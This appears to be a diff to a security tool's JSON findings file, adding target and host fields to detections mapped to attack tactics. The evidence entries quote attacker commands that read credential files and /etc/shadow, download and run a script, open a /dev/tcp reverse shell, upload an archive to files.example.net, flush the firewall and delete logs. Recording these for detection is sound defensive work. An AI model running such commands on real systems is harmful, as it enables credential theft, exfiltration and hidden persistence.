@@ -23,7 +23,17 @@
         "line": null,
         "text": "useradd -m -s /bin/bash svc"
       }
-    ]
+    ],
+    "what": "useradd -m -s /bin/bash svc (20261022_091500_step04_persist.sh:7)\nuseradd -m -s /bin/bash svc (audit_20261022_093500.jsonl)",
+    "targets": "account svc",
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": "svc",
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "CloudMetadataAccess",
@@ -43,7 +53,17 @@
         "line": 9,
         "text": "curl -s http://169.254.169.254/latest/meta-data/ > meta_20261022_090040.txt"
       }
-    ]
+    ],
+    "what": "curl -s http://169.254.169.254/latest/meta-data/ > meta_20261022_090040.txt (20261022_090000_step01_recon.sh:9)",
+    "targets": "url http://169.254.169.254/latest/meta-data/",
+    "ip": "169.254.169.254",
+    "host": null,
+    "url": "http://169.254.169.254/latest/meta-data/",
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "ClusterSecretRead",
@@ -63,7 +83,17 @@
         "line": 7,
         "text": "kubectl get secrets -A -o yaml"
       }
-    ]
+    ],
+    "what": "kubectl get secrets -A -o yaml (20261022_090500_step02_creds.sh:7)",
+    "targets": null,
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "ContainerEscape",
@@ -83,7 +113,17 @@
         "line": 6,
         "text": "docker run -v /:/host alpine ls /host"
       }
-    ]
+    ],
+    "what": "docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)",
+    "targets": "mount /:/host",
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "CredentialFileRead",
@@ -103,7 +143,17 @@
         "line": 3,
         "text": "cat ~/.aws/credentials"
       }
-    ]
+    ],
+    "what": "cat ~/.aws/credentials (20261022_090500_step02_creds.sh:3)",
+    "targets": "file ~/.aws/credentials",
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "FileUpload",
@@ -123,7 +173,17 @@
         "line": 8,
         "text": "curl -T out.tgz https://files.example.net/up"
       }
-    ]
+    ],
+    "what": "curl -T out.tgz https://files.example.net/up (20261022_092500_step06_stage.sh:8)",
+    "targets": "url https://files.example.net/up; file out.tgz",
+    "ip": null,
+    "host": "files.example.net",
+    "url": "https://files.example.net/up",
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "FirewallDisabling",
@@ -149,7 +209,17 @@
         "line": null,
         "text": "iptables -F"
       }
-    ]
+    ],
+    "what": "iptables -F (20261022_092000_step05_evade.sh:5)\niptables -F (audit_20261022_093500.jsonl)",
+    "targets": null,
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "HistoryDisabling",
@@ -169,7 +239,17 @@
         "line": 3,
         "text": "unset HISTFILE"
       }
-    ]
+    ],
+    "what": "unset HISTFILE (20261022_092000_step05_evade.sh:3)",
+    "targets": "setting HISTFILE",
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "LogDeletion",
@@ -189,7 +269,17 @@
         "line": 6,
         "text": "rm -f /var/log/auth.log"
       }
-    ]
+    ],
+    "what": "rm -f /var/log/auth.log (20261022_092000_step05_evade.sh:6)",
+    "targets": "log /var/log/auth.log",
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "PrivateKeyRead",
@@ -209,7 +299,17 @@
         "line": 4,
         "text": "cat ~/.ssh/id_rsa"
       }
-    ]
+    ],
+    "what": "cat ~/.ssh/id_rsa (20261022_090500_step02_creds.sh:4)",
+    "targets": "file ~/.ssh/id_rsa",
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "ReverseShell",
@@ -229,7 +329,17 @@
         "line": 8,
         "text": "os.system(\"exec 3<>/dev/tcp/$H/$PORT\")"
       }
-    ]
+    ],
+    "what": "os.system(\"exec 3<>/dev/tcp/$H/$PORT\") (20261022_093000_step07_channel.py:8)",
+    "targets": "host 203.0.113.41 ($H); port $PORT",
+    "ip": "203.0.113.41",
+    "host": "203.0.113.41",
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "ScheduledJobCreation",
@@ -255,7 +365,17 @@
         "line": null,
         "text": "crontab -"
       }
-    ]
+    ],
+    "what": "(crontab -l; echo \"$JOB\") | crontab - (20261022_091500_step04_persist.sh:3)\ncrontab - (audit_20261022_093500.jsonl)",
+    "targets": "runs $JOB",
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "SecurityToolDisabling",
@@ -281,7 +401,17 @@
         "line": null,
         "text": "systemctl stop auditd"
       }
-    ]
+    ],
+    "what": "systemctl stop auditd (20261022_092000_step05_evade.sh:4)\nsystemctl stop auditd (audit_20261022_093500.jsonl)",
+    "targets": "service auditd",
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": "auditd"
   },
   {
     "finding": "SetuidBit",
@@ -301,7 +431,17 @@
         "line": 4,
         "text": "chmod u+s \"$F\""
       }
-    ]
+    ],
+    "what": "chmod u+s \"$F\" (20261022_091000_step03_privesc.sh:4)",
+    "targets": "file /tmp/tool ($F)",
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "ShadowFileRead",
@@ -321,7 +461,17 @@
         "line": 6,
         "text": "sudo cat /etc/shadow > shadow_20261022_090530.txt"
       }
-    ]
+    ],
+    "what": "sudo cat /etc/shadow > shadow_20261022_090530.txt (20261022_090500_step02_creds.sh:6)",
+    "targets": "file /etc/shadow",
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "ShellDownloadAndExecute",
@@ -341,7 +491,17 @@
         "line": 4,
         "text": "sudo bash -c \"$(curl -fsSL http://203.0.113.40/s.sh)\""
       }
-    ]
+    ],
+    "what": "sudo bash -c \"$(curl -fsSL http://203.0.113.40/s.sh)\" (20261022_092500_step06_stage.sh:4)",
+    "targets": "url http://203.0.113.40/s.sh",
+    "ip": "203.0.113.40",
+    "host": null,
+    "url": "http://203.0.113.40/s.sh",
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "ShellHistoryRead",
@@ -361,7 +521,17 @@
         "line": 5,
         "text": "grep -i token ~/.bash_history"
       }
-    ]
+    ],
+    "what": "grep -i token ~/.bash_history (20261022_090500_step02_creds.sh:5)",
+    "targets": "file ~/.bash_history",
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "ShellProfilePersistence",
@@ -381,7 +551,17 @@
         "line": 8,
         "text": "echo \"$LINE\" >> ~/.bashrc"
       }
-    ]
+    ],
+    "what": "echo \"$LINE\" >> ~/.bashrc (20261022_091500_step04_persist.sh:8)",
+    "targets": "file ~/.bashrc; adds $LINE",
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "SshKeyPersistence",
@@ -401,7 +581,17 @@
         "line": 4,
         "text": "echo \"$KEY\" >> ~/.ssh/authorized_keys"
       }
-    ]
+    ],
+    "what": "echo \"$KEY\" >> ~/.ssh/authorized_keys (20261022_091500_step04_persist.sh:4)",
+    "targets": "file ~/.ssh/authorized_keys",
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "SudoersModification",
@@ -421,7 +611,17 @@
         "line": 5,
         "text": "echo \"$RULE\" >> /etc/sudoers.d/svc"
       }
-    ]
+    ],
+    "what": "echo \"$RULE\" >> /etc/sudoers.d/svc (20261022_091000_step03_privesc.sh:5)",
+    "targets": "file /etc/sudoers.d/svc; rule $RULE",
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "SystemdUnitCreation",
@@ -447,7 +647,17 @@
         "line": 6,
         "text": "systemctl enable --now sync.service"
       }
-    ]
+    ],
+    "what": "cp sync.service /etc/systemd/system/sync.service (20261022_091500_step04_persist.sh:5)\nsystemctl enable --now sync.service (20261022_091500_step04_persist.sh:6)",
+    "targets": "unit sync.service",
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": "sync.service"
   },
   {
     "finding": "Domain",
@@ -460,7 +670,17 @@
     "last": "2026-10-22T09:00:25Z",
     "attack": null,
     "atlas": null,
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": null,
+    "host": "build01.corp.internal",
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "Domain",
@@ -473,7 +693,17 @@
     "last": "2026-10-22T09:05:40Z",
     "attack": null,
     "atlas": null,
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": null,
+    "host": "corp.example",
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "Domain",
@@ -486,7 +716,17 @@
     "last": "2026-10-22T09:05:40Z",
     "attack": null,
     "atlas": null,
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": null,
+    "host": "db01.corp.internal",
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "Domain",
@@ -499,7 +739,17 @@
     "last": "2026-10-22T09:25:00Z",
     "attack": null,
     "atlas": null,
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": null,
+    "host": "files.example.net",
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "Email",
@@ -512,7 +762,17 @@
     "last": "2026-10-22T09:05:40Z",
     "attack": null,
     "atlas": null,
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": "alerts@corp.example",
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "IPv4",
@@ -525,7 +785,17 @@
     "last": "2026-10-22T09:00:25Z",
     "attack": null,
     "atlas": null,
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": "10.20.30.5",
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "IPv4",
@@ -538,7 +808,17 @@
     "last": "2026-10-22T09:00:25Z",
     "attack": null,
     "atlas": null,
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": "10.20.30.6",
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "IPv4",
@@ -551,7 +831,17 @@
     "last": "2026-10-22T09:00:25Z",
     "attack": null,
     "atlas": null,
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": "127.0.0.1",
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "IPv4",
@@ -564,7 +854,17 @@
     "last": "2026-10-22T09:00:00Z",
     "attack": null,
     "atlas": null,
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": "169.254.169.254",
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "IPv4",
@@ -577,7 +877,17 @@
     "last": "2026-10-22T09:25:00Z",
     "attack": null,
     "atlas": null,
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": "198.51.100.7",
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "IPv4",
@@ -590,7 +900,17 @@
     "last": "2026-10-22T09:25:00Z",
     "attack": null,
     "atlas": null,
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": "203.0.113.40",
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "IPv4",
@@ -603,7 +923,17 @@
     "last": "2026-10-22T09:30:00Z",
     "attack": null,
     "atlas": null,
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": "203.0.113.41",
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "URL",
@@ -616,7 +946,17 @@
     "last": "2026-10-22T09:00:00Z",
     "attack": null,
     "atlas": null,
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": null,
+    "host": null,
+    "url": "http://169.254.169.254/latest/meta-data/",
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "URL",
@@ -629,7 +969,17 @@
     "last": "2026-10-22T09:25:00Z",
     "attack": null,
     "atlas": null,
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": null,
+    "host": null,
+    "url": "http://203.0.113.40/s.sh",
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "URL",
@@ -642,7 +992,17 @@
     "last": "2026-10-22T09:25:00Z",
     "attack": null,
     "atlas": null,
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": null,
+    "host": null,
+    "url": "https://files.example.net/up",
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "tactic",
@@ -655,7 +1015,17 @@
     "last": "2026-10-22T09:30:00Z",
     "attack": "TA0011",
     "atlas": "AML.TA0014",
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "tactic",
@@ -668,7 +1038,17 @@
     "last": "2026-10-22T09:05:00Z",
     "attack": "TA0006",
     "atlas": "AML.TA0013",
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "tactic",
@@ -681,7 +1061,17 @@
     "last": "2026-10-22T09:35:00Z",
     "attack": "TA0112",
     "atlas": "AML.TA0007",
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "tactic",
@@ -694,7 +1084,17 @@
     "last": "2026-10-22T09:30:00Z",
     "attack": "TA0010",
     "atlas": "AML.TA0010",
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "tactic",
@@ -707,7 +1107,17 @@
     "last": "2026-10-22T09:25:00Z",
     "attack": "TA0008",
     "atlas": "AML.TA0015",
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "tactic",
@@ -720,7 +1130,17 @@
     "last": "2026-10-22T09:35:00Z",
     "attack": "TA0003",
     "atlas": "AML.TA0006",
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "tactic",
@@ -733,7 +1153,17 @@
     "last": "2026-10-22T09:15:00Z",
     "attack": "TA0004",
     "atlas": "AML.TA0012",
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "ArchiveCreation",
@@ -759,7 +1189,17 @@
         "line": 7,
         "text": "find /srv -name '*.bak' -exec gzip {} \\;"
       }
-    ]
+    ],
+    "what": "tar czf out.tgz dir/ (20261022_092500_step06_stage.sh:3)\nfind /srv -name '*.bak' -exec gzip {} \\; (20261022_092500_step06_stage.sh:7)",
+    "targets": "archive out.tgz",
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "HistoryClearing",
@@ -779,7 +1219,17 @@
         "line": 7,
         "text": "history -c"
       }
-    ]
+    ],
+    "what": "history -c (20261022_092000_step05_evade.sh:7)",
+    "targets": null,
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "Timestomp",
@@ -799,7 +1249,17 @@
         "line": 8,
         "text": "touch -r /bin/ls \"$F\""
       }
-    ]
+    ],
+    "what": "touch -r /bin/ls \"$F\" (20261022_092000_step05_evade.sh:8)",
+    "targets": "file $F",
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "tactic",
@@ -812,7 +1272,17 @@
     "last": "2026-10-22T09:25:00Z",
     "attack": "TA0009",
     "atlas": "AML.TA0009",
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "tactic",
@@ -825,7 +1295,17 @@
     "last": "2026-10-22T09:35:00Z",
     "attack": "TA0002",
     "atlas": "AML.TA0005",
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "tactic",
@@ -838,7 +1318,17 @@
     "last": "2026-10-22T09:20:00Z",
     "attack": "TA0005",
     "atlas": "AML.TA0007",
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "EmailAccountDiscovery",
@@ -858,7 +1348,17 @@
         "line": 4,
         "text": "SMTP_USER=alerts@corp.example"
       }
-    ]
+    ],
+    "what": "SMTP_USER=alerts@corp.example (env_20261022_090540.txt:4)",
+    "targets": null,
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": "alerts@corp.example",
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "LocalAccountDiscovery",
@@ -896,7 +1396,17 @@
         "line": 4,
         "text": "app_rw:x:1001:1001:Application:/home/app_rw:/bin/bash"
       }
-    ]
+    ],
+    "what": "root:x:0:0:root:/root:/bin/bash (passwd_20261022_090020.txt:1)\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin (passwd_20261022_090020.txt:2)\ndeploy:x:1000:1000:Deploy:/home/deploy:/bin/bash (passwd_20261022_090020.txt:3)\napp_rw:x:1001:1001:Application:/home/app_rw:/bin/bash (passwd_20261022_090020.txt:4)",
+    "targets": null,
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": "root, daemon, deploy, app_rw",
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "ServiceDiscovery",
@@ -916,7 +1426,17 @@
         "line": 7,
         "text": "systemctl status sshd"
       }
-    ]
+    ],
+    "what": "systemctl status sshd (20261022_090000_step01_recon.sh:7)",
+    "targets": "service sshd",
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": "sshd"
   },
   {
     "finding": "SetuidFileSearch",
@@ -936,7 +1456,17 @@
         "line": 8,
         "text": "find / -perm -4000 -type f 2>/dev/null > suid_20261022_090030.txt"
       }
-    ]
+    ],
+    "what": "find / -perm -4000 -type f 2>/dev/null > suid_20261022_090030.txt (20261022_090000_step01_recon.sh:8)",
+    "targets": "searched /",
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   },
   {
     "finding": "tactic",
@@ -949,6 +1479,16 @@
     "last": "2026-10-22T09:25:00Z",
     "attack": "TA0007",
     "atlas": "AML.TA0008",
-    "evidence": null
+    "evidence": null,
+    "what": null,
+    "targets": null,
+    "ip": null,
+    "host": null,
+    "url": null,
+    "account": null,
+    "tenant": null,
+    "application": null,
+    "task": null,
+    "service": null
   }
 ]
